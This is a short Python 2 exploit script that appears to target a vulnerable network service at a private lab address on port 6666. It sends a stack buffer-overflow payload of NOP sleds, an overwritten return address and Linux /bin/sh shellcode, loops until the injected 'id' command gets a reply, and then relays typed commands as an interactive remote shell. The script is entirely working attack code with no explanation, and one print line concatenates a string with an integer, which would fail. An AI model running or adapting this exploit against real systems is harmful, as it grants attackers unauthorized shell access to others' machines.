#!/usr/bin/python

from socket import *

host='192.168.230.139'
port=6666

nop1="\x90"*52
ret="\x00\xb0\xff\xbf"
nop2="\x90"*176
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
payload = nop1+ret+nop2+shellcode

buffer=""

while(1):
   sock = socket(AF_INET, SOCK_STREAM)
   sock.connect((host, port))
   for i in range(0,2):
      buffer = sock.recv(1024)
      print buffer
   sock.send(payload)
   sock.send('id')
   buffer = sock.recv(1024)
   if(len(buffer)!=0):
      print "end "+len(buffer)
      break
   else: sock.close()
while(1): 
   sock.send(raw_input())
   buffer = sock.recv(1024)
